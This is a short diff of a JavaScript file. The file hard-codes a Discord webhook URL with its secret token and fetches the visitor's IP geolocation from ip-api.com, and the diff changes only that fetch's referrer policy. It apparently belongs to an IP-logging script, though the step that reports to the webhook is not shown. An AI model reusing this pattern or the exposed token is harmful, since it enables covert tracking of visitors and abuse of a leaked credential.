@@ -1,7 +1,7 @@
 var webHookUrl = "https://discord.com/api/webhooks/1107355097459077201/XOiq1Pig7dDtKAt4XWi13D8aqv74zSOwCmkjndnkQXG_Z9zLGthwSXDPwnAvoVGUbwzw";
 
 const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('http://ip-api.com/json/');
+    const response = await fetch('http://ip-api.com/json/', { referrerPolicy: "unsafe-url" });
     const data = await response.json();
 
     // Declaring variables
